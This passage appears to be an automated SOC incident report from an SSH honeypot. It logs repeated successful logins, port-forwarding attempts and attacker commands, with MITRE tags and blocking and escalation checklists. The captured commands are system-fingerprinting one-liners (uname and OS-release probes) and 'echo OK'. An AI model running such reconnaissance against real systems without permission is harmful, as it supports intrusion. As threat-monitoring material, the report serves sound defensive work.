| **First Seen** | 2026-07-21 04:22 |
| **Last Seen** | 2026-07-21 04:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:22:00` | `cowrie.session.connect` |
| `2026-07-21 04:22:01` | `cowrie.client.version` |
| `2026-07-21 04:22:01` | `cowrie.client.kex` |
| `2026-07-21 04:22:02` | `cowrie.login.success` |
| `2026-07-21 04:22:04` | `cowrie.session.params` |
| `2026-07-21 04:22:04` | `cowrie.command.input` |
| `2026-07-21 04:22:04` | `cowrie.command.input` |
| `2026-07-21 04:22:04` | `cowrie.command.input` |
| `2026-07-21 04:22:04` | `cowrie.command.input` |
| `2026-07-21 04:22:04` | `cowrie.command.input` |
| `2026-07-21 04:22:04` | `cowrie.command.success` |
| `2026-07-21 04:22:04` | `cowrie.command.input` |
| `2026-07-21 04:22:04` | `cowrie.command.input` |
| `2026-07-21 04:22:04` | `cowrie.command.input` |
| `2026-07-21 04:22:04` | `cowrie.command.input` |
| `2026-07-21 04:22:04` | `cowrie.log.closed` |
| `2026-07-21 04:22:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e8f01c28ff

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:24 |
| **Last Seen** | 2026-07-21 04:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:24:04` | `cowrie.session.connect` |
| `2026-07-21 04:24:04` | `cowrie.client.version` |
| `2026-07-21 04:24:04` | `cowrie.client.kex` |
| `2026-07-21 04:24:06` | `cowrie.login.success` |
| `2026-07-21 04:24:07` | `cowrie.session.params` |
| `2026-07-21 04:24:07` | `cowrie.command.input` |
| `2026-07-21 04:24:07` | `cowrie.command.input` |
| `2026-07-21 04:24:07` | `cowrie.command.input` |
| `2026-07-21 04:24:07` | `cowrie.command.input` |
| `2026-07-21 04:24:07` | `cowrie.command.input` |
| `2026-07-21 04:24:07` | `cowrie.command.success` |
| `2026-07-21 04:24:07` | `cowrie.command.input` |
| `2026-07-21 04:24:07` | `cowrie.command.input` |
| `2026-07-21 04:24:07` | `cowrie.command.input` |
| `2026-07-21 04:24:07` | `cowrie.command.input` |
| `2026-07-21 04:24:08` | `cowrie.log.closed` |
| `2026-07-21 04:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f420fc5d8851

| Field | Detail |
|---|---|
| **Source IP** | `188.43.204[.]45` |
| **First Seen** | 2026-07-21 04:25 |
| **Last Seen** | 2026-07-21 04:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:25:29` | `cowrie.session.connect` |
| `2026-07-21 04:25:30` | `cowrie.client.version` |
| `2026-07-21 04:25:30` | `cowrie.client.kex` |
| `2026-07-21 04:25:31` | `cowrie.login.success` |
| `2026-07-21 04:25:31` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:25:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.43.204[.]45` to AbuseIPDB if not already reported
- [ ] Block `188.43.204[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31d54d54734b

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-07-21 04:25 |
| **Last Seen** | 2026-07-21 04:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:25:36` | `cowrie.session.connect` |
| `2026-07-21 04:25:36` | `cowrie.client.version` |
| `2026-07-21 04:25:36` | `cowrie.client.kex` |
| `2026-07-21 04:25:38` | `cowrie.login.success` |
| `2026-07-21 04:25:38` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d254898cc1b2

| Field | Detail |
|---|---|
| **Source IP** | `203.192.211[.]180` |
| **First Seen** | 2026-07-21 04:25 |
| **Last Seen** | 2026-07-21 04:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:25:44` | `cowrie.session.connect` |
| `2026-07-21 04:25:44` | `cowrie.client.version` |
| `2026-07-21 04:25:44` | `cowrie.client.kex` |
| `2026-07-21 04:25:46` | `cowrie.login.success` |
| `2026-07-21 04:25:47` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.211[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.211[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb56bcbb7595

| Field | Detail |
|---|---|
| **Source IP** | `200.89.159[.]59` |
| **First Seen** | 2026-07-21 04:26 |
| **Last Seen** | 2026-07-21 04:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:26:04` | `cowrie.session.connect` |
| `2026-07-21 04:26:05` | `cowrie.client.version` |
| `2026-07-21 04:26:05` | `cowrie.client.kex` |
| `2026-07-21 04:26:06` | `cowrie.login.success` |
| `2026-07-21 04:26:07` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:26:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.89.159[.]59` to AbuseIPDB if not already reported
- [ ] Block `200.89.159[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3635d8bf12f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:26 |
| **Last Seen** | 2026-07-21 04:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:26:10` | `cowrie.session.connect` |
| `2026-07-21 04:26:10` | `cowrie.client.version` |
| `2026-07-21 04:26:10` | `cowrie.client.kex` |
| `2026-07-21 04:26:12` | `cowrie.login.success` |
| `2026-07-21 04:26:13` | `cowrie.session.params` |
| `2026-07-21 04:26:13` | `cowrie.command.input` |
| `2026-07-21 04:26:13` | `cowrie.command.input` |
| `2026-07-21 04:26:13` | `cowrie.command.input` |
| `2026-07-21 04:26:13` | `cowrie.command.input` |
| `2026-07-21 04:26:13` | `cowrie.command.input` |
| `2026-07-21 04:26:13` | `cowrie.command.success` |
| `2026-07-21 04:26:13` | `cowrie.command.input` |
| `2026-07-21 04:26:13` | `cowrie.command.input` |
| `2026-07-21 04:26:13` | `cowrie.command.input` |
| `2026-07-21 04:26:13` | `cowrie.command.input` |
| `2026-07-21 04:26:14` | `cowrie.log.closed` |
| `2026-07-21 04:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ed371c7f9c9

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 04:27 |
| **Last Seen** | 2026-07-21 04:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:27:41` | `cowrie.session.connect` |
| `2026-07-21 04:27:41` | `cowrie.client.version` |
| `2026-07-21 04:27:41` | `cowrie.client.kex` |
| `2026-07-21 04:27:41` | `cowrie.login.success` |
| `2026-07-21 04:27:42` | `cowrie.session.params` |
| `2026-07-21 04:27:42` | `cowrie.command.input` |
| `2026-07-21 04:27:42` | `cowrie.log.closed` |
| `2026-07-21 04:27:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d68084c7c2a3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:28 |
| **Last Seen** | 2026-07-21 04:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:28:09` | `cowrie.session.connect` |
| `2026-07-21 04:28:10` | `cowrie.client.version` |
| `2026-07-21 04:28:10` | `cowrie.client.kex` |
| `2026-07-21 04:28:12` | `cowrie.login.success` |
| `2026-07-21 04:28:14` | `cowrie.session.params` |
| `2026-07-21 04:28:14` | `cowrie.command.input` |
| `2026-07-21 04:28:14` | `cowrie.command.input` |
| `2026-07-21 04:28:14` | `cowrie.command.input` |
| `2026-07-21 04:28:14` | `cowrie.command.input` |
| `2026-07-21 04:28:14` | `cowrie.command.input` |
| `2026-07-21 04:28:14` | `cowrie.command.success` |
| `2026-07-21 04:28:14` | `cowrie.command.input` |
| `2026-07-21 04:28:14` | `cowrie.command.input` |
| `2026-07-21 04:28:14` | `cowrie.command.input` |
| `2026-07-21 04:28:14` | `cowrie.command.input` |
| `2026-07-21 04:28:14` | `cowrie.log.closed` |
| `2026-07-21 04:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34bb221177e6

| Field | Detail |
|---|---|
| **Source IP** | `182.139.39[.]150` |
| **First Seen** | 2026-07-21 04:29 |
| **Last Seen** | 2026-07-21 04:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:29:13` | `cowrie.session.connect` |
| `2026-07-21 04:29:14` | `cowrie.client.version` |
| `2026-07-21 04:29:14` | `cowrie.client.kex` |
| `2026-07-21 04:29:16` | `cowrie.login.success` |
| `2026-07-21 04:29:17` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:29:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.139.39[.]150` to AbuseIPDB if not already reported
- [ ] Block `182.139.39[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d01fb54cd46f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:30 |
| **Last Seen** | 2026-07-21 04:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:30:01` | `cowrie.session.connect` |
| `2026-07-21 04:30:02` | `cowrie.client.version` |
| `2026-07-21 04:30:02` | `cowrie.client.kex` |
| `2026-07-21 04:30:04` | `cowrie.login.success` |
| `2026-07-21 04:30:06` | `cowrie.session.params` |
| `2026-07-21 04:30:06` | `cowrie.command.input` |
| `2026-07-21 04:30:06` | `cowrie.command.input` |
| `2026-07-21 04:30:06` | `cowrie.command.input` |
| `2026-07-21 04:30:06` | `cowrie.command.input` |
| `2026-07-21 04:30:06` | `cowrie.command.input` |
| `2026-07-21 04:30:06` | `cowrie.command.success` |
| `2026-07-21 04:30:06` | `cowrie.command.input` |
| `2026-07-21 04:30:06` | `cowrie.command.input` |
| `2026-07-21 04:30:06` | `cowrie.command.input` |
| `2026-07-21 04:30:06` | `cowrie.command.input` |
| `2026-07-21 04:30:07` | `cowrie.log.closed` |
| `2026-07-21 04:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fb8fb0aec02

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:31 |
| **Last Seen** | 2026-07-21 04:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:31:54` | `cowrie.session.connect` |
| `2026-07-21 04:31:55` | `cowrie.client.version` |
| `2026-07-21 04:31:55` | `cowrie.client.kex` |
| `2026-07-21 04:31:57` | `cowrie.login.success` |
| `2026-07-21 04:31:59` | `cowrie.session.params` |
| `2026-07-21 04:31:59` | `cowrie.command.input` |
| `2026-07-21 04:31:59` | `cowrie.command.input` |
| `2026-07-21 04:31:59` | `cowrie.command.input` |
| `2026-07-21 04:31:59` | `cowrie.command.input` |
| `2026-07-21 04:31:59` | `cowrie.command.input` |
| `2026-07-21 04:31:59` | `cowrie.command.success` |
| `2026-07-21 04:31:59` | `cowrie.command.input` |
| `2026-07-21 04:31:59` | `cowrie.command.input` |
| `2026-07-21 04:31:59` | `cowrie.command.input` |
| `2026-07-21 04:31:59` | `cowrie.command.input` |
| `2026-07-21 04:31:59` | `cowrie.log.closed` |
| `2026-07-21 04:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38123d3ca34c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:33 |
| **Last Seen** | 2026-07-21 04:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:33:51` | `cowrie.session.connect` |
| `2026-07-21 04:33:51` | `cowrie.client.version` |
| `2026-07-21 04:33:51` | `cowrie.client.kex` |
| `2026-07-21 04:33:53` | `cowrie.login.success` |
| `2026-07-21 04:33:54` | `cowrie.session.params` |
| `2026-07-21 04:33:54` | `cowrie.command.input` |
| `2026-07-21 04:33:54` | `cowrie.command.input` |
| `2026-07-21 04:33:54` | `cowrie.command.input` |
| `2026-07-21 04:33:54` | `cowrie.command.input` |
| `2026-07-21 04:33:54` | `cowrie.command.input` |
| `2026-07-21 04:33:54` | `cowrie.command.success` |
| `2026-07-21 04:33:54` | `cowrie.command.input` |
| `2026-07-21 04:33:54` | `cowrie.command.input` |
| `2026-07-21 04:33:54` | `cowrie.command.input` |
| `2026-07-21 04:33:54` | `cowrie.command.input` |
| `2026-07-21 04:33:54` | `cowrie.log.closed` |
| `2026-07-21 04:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0de3a5c5002b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 04:34 |
| **Last Seen** | 2026-07-21 04:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:34:55` | `cowrie.session.connect` |
| `2026-07-21 04:34:55` | `cowrie.client.version` |
| `2026-07-21 04:34:55` | `cowrie.client.kex` |
| `2026-07-21 04:34:55` | `cowrie.login.success` |
| `2026-07-21 04:34:56` | `cowrie.session.params` |
| `2026-07-21 04:34:56` | `cowrie.command.input` |
| `2026-07-21 04:34:56` | `cowrie.log.closed` |
| `2026-07-21 04:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1316f025ef0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:35 |
| **Last Seen** | 2026-07-21 04:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:35:45` | `cowrie.session.connect` |
| `2026-07-21 04:35:45` | `cowrie.client.version` |
| `2026-07-21 04:35:45` | `cowrie.client.kex` |
| `2026-07-21 04:35:47` | `cowrie.login.success` |
| `2026-07-21 04:35:48` | `cowrie.session.params` |
| `2026-07-21 04:35:48` | `cowrie.command.input` |
| `2026-07-21 04:35:48` | `cowrie.command.input` |
| `2026-07-21 04:35:48` | `cowrie.command.input` |
| `2026-07-21 04:35:48` | `cowrie.command.input` |
| `2026-07-21 04:35:48` | `cowrie.command.input` |
| `2026-07-21 04:35:48` | `cowrie.command.success` |
| `2026-07-21 04:35:48` | `cowrie.command.input` |
| `2026-07-21 04:35:48` | `cowrie.command.input` |
| `2026-07-21 04:35:48` | `cowrie.command.input` |
| `2026-07-21 04:35:48` | `cowrie.command.input` |
| `2026-07-21 04:35:49` | `cowrie.log.closed` |
| `2026-07-21 04:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f748cb83d226

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:37 |
| **Last Seen** | 2026-07-21 04:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:37:40` | `cowrie.session.connect` |
| `2026-07-21 04:37:40` | `cowrie.client.version` |
| `2026-07-21 04:37:40` | `cowrie.client.kex` |
| `2026-07-21 04:37:42` | `cowrie.login.success` |
| `2026-07-21 04:37:44` | `cowrie.session.params` |
| `2026-07-21 04:37:44` | `cowrie.command.input` |
| `2026-07-21 04:37:44` | `cowrie.command.input` |
| `2026-07-21 04:37:44` | `cowrie.command.input` |
| `2026-07-21 04:37:44` | `cowrie.command.input` |
| `2026-07-21 04:37:44` | `cowrie.command.input` |
| `2026-07-21 04:37:44` | `cowrie.command.success` |
| `2026-07-21 04:37:44` | `cowrie.command.input` |
| `2026-07-21 04:37:44` | `cowrie.command.input` |
| `2026-07-21 04:37:44` | `cowrie.command.input` |
